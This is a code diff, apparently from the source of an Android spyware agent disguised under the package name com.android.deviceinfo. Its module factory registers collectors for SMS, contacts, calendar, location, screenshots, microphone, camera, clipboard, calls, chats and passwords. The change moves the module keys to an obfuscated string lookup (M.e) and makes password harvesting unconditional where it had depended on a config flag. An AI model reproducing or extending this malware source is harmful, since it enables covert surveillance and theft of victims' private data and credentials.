@@ -12,10 +12,10 @@ package com.android.deviceinfo.module;
 import java.util.Enumeration;
 import java.util.Hashtable;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.interfaces.AbstractFactory;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
@@ -23,23 +23,22 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	Hashtable<Class, String> typemap = new Hashtable<Class, String>();
 
 	public FactoryModule() {
-		factorymap.put(Messages.getString("c_0"), ModuleMessage.class);
-		factorymap.put(Messages.getString("c_1"), ModuleAddressBook.class);
-		factorymap.put(Messages.getString("c_2"), ModuleCalendar.class);
-		factorymap.put(Messages.getString("c_4"), ModuleDevice.class);
-		factorymap.put(Messages.getString("c_5"), ModulePosition.class);
-		factorymap.put(Messages.getString("c_6"), ModuleSnapshot.class);
-		factorymap.put(Messages.getString("c_7"), ModuleMessage.class);
-		factorymap.put(Messages.getString("c_8"), ModuleMic.class);
-		factorymap.put(Messages.getString("c_9"), ModuleCamera.class);
-		factorymap.put(Messages.getString("c_10"), ModuleClipboard.class);
-		factorymap.put(Messages.getString("c_11"), ModuleCrisis.class);
-		factorymap.put(Messages.getString("c_12"), ModuleApplication.class);
-		factorymap.put(Messages.getString("c_13"), ModuleCall.class);
-		factorymap.put(Messages.getString("c_14"), ModuleChat.class);
-		if (Cfg.ENABLE_PASSWORD_MODULE) {
-			factorymap.put(Messages.getString("c_15"), ModulePassword.class);
-		}
+		factorymap.put(M.e("sms"), ModuleMessage.class);
+		factorymap.put(M.e("addressbook"), ModuleAddressBook.class);
+		factorymap.put(M.e("calendar"), ModuleCalendar.class);
+		factorymap.put(M.e("device"), ModuleDevice.class);
+		factorymap.put(M.e("position"), ModulePosition.class);
+		factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
+		factorymap.put(M.e("messages"), ModuleMessage.class);
+		factorymap.put(M.e("mic"), ModuleMic.class);
+		factorymap.put(M.e("camera"), ModuleCamera.class);
+		factorymap.put(M.e("clipboard"), ModuleClipboard.class);
+		factorymap.put(M.e("crisis"), ModuleCrisis.class);
+		factorymap.put(M.e("application"), ModuleApplication.class);
+		factorymap.put(M.e("call"), ModuleCall.class);
+		factorymap.put(M.e("chat"), ModuleChat.class);
+		factorymap.put(M.e("password"), ModulePassword.class);
+		
 
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
